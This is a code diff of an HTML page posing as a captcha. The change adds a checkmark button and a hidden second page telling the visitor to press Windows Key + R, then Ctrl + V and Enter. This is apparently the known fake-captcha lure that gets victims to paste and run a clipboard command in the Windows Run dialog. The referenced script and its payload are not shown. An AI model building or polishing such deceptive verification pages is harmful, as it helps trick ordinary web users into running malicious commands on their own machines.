@@ -7,13 +7,13 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="captcha-container">
+    <div class="captcha-container" id="captcha-page">
         <img src="captcha.png" alt="Captcha Image" class="captcha-image">
         <div class="instruction">Please solve the captcha below:</div>
-        <button class="button" id="solve-captcha">Solve Captcha</button>
-        <div class="instruction" id="additional-instruction" style="display: none;">
-            Press Windows Key + R, then press Ctrl + V and Enter.
-        </div>
+        <button class="button checkmark" id="checkmark-button">✓</button>
+    </div>
+    <div class="captcha-container" id="additional-page" style="display: none;">
+        <div class="instruction">Press Windows Key + R, then press Ctrl + V and Enter.</div>
     </div>
     <script src="javascript.js"></script>
 </body>
